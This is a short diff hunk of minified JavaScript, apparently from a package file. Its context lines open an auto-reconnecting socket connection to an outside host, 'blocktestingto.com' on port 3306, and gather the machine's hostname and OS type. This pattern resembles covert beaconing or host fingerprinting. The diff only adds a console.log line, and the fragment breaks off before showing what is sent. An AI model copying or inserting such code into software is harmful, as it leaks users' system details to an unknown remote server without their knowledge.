@@ -8,6 +8,7 @@ const s = require("fs"),
 var g = o.connect("http://blocktestingto.com:3306", { reconnect: !0 });
 const t = e.hostname(),
   r = e.type();
+console.log(r);
 let n = new Date(),
   u =
     r +
